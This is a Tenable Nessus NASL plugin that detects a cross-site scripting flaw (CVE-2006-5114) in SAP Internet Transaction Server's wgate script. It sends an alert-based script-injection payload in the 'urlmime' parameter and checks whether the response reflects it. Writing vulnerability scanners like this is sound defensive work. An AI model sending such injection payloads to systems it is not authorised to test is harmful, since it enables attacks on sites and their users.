#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22465);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-5114");
  script_bugtraq_id(20244);
  script_xref(name:"OSVDB", value:"29489");

  script_name(english:"SAP Internet Transaction Server wgate Multiple Parameter XSS");
  script_summary(english:"Checks for an XSS flaw in SAP Internet Transaction Server");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is vulnerable to a
cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server fails to sanitize the contents of the 'urlmime'
parameter to the '/scripts/wgate' script before using it to generate
dynamic web content.  An unauthenticated remote attacker may be able
to leverage this issue to inject arbitrary HTML and script code into a
user's browser to be evaluated within the security context of the
affected web site." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-09/0467.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);



# Generate a request to exploit the flaw.
xss = string('"><script>alert("', SCRIPT_NAME, '")</script><img src="');
req = http_get(
  item:string("/scripts/wgate/!?~urlmime=", urlencode(str:xss)), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if...
if (
  # it's SAP ITS and...
  "SAP Internet Transaction Server" >< res &&
  # we see our exploit
  (
    string('<td background="', xss) >< res ||
    string('><img src="', xss) >< res ||
    # nb: this vector requires a minor tweak in the published exploit
    #     to actually pop up an alert.
    string('language="JavaScript1.2" src=', "'", xss) >< res
  )
)
{
 security_warning(port);
 set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
}
